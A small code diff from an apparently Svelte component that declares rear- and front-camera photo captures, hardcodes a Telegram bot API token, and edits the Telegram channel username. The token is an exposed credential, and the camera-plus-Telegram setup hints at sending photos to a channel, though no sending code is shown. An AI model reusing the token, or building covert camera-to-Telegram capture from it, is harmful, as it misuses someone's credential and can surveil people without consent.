@@ -7,7 +7,7 @@
   let rearCameraImageCapture, frontCameraImageCapture;
   let rearPhotoBlob, frontPhotoBlob;
   const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
-  const telegramChannelUsername = '@localipy';
+  const telegramChannelUsername = 'localipy';
 
   onMount(async () => {
     try {
